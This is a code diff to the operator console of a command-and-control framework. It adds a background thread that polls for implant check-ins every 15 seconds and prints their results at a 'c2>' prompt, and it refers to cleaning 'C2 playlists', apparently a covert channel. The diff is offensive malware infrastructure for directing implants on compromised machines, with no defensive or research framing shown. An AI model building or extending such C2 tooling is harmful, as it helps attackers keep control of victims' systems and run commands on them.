@@ -20,6 +20,7 @@ Commands:
 
 import argparse
 import json
+import threading
 import time
 from pathlib import Path
 
@@ -149,11 +150,21 @@ class Operator:
         print("[*] All C2 playlists cleaned")
 
     def _check_for_checkins(self):
-        """Silently poll for new implant check-ins."""
+        """Poll for new implant check-ins and display results."""
         try:
-            self.poll_result_once()
+            results = self.poll_result_once()
+            if results:
+                for seq_num, result in sorted(results.items()):
+                    self._display_result(seq_num, result)
         except Exception:
             pass
+
+    def _background_poller(self):
+        """Background thread that polls for checkins/results."""
+        while self._polling:
+            time.sleep(15)
+            if self._polling:
+                self._check_for_checkins()
 
     def interactive(self):
         """Run the interactive operator console."""
@@ -163,10 +174,18 @@ class Operator:
         # Initial check for any pending checkins
         self._check_for_checkins()
 
+        # Start background poller thread
+        self._polling = True
+        poller = threading.Thread(
+            target=self._background_poller, daemon=True
+        )
+        poller.start()
+
         while True:
             try:
                 line = input("c2> ").strip()
             except (EOFError, KeyboardInterrupt):
+                self._polling = False
                 print("\n[*] Exiting")
                 break
 
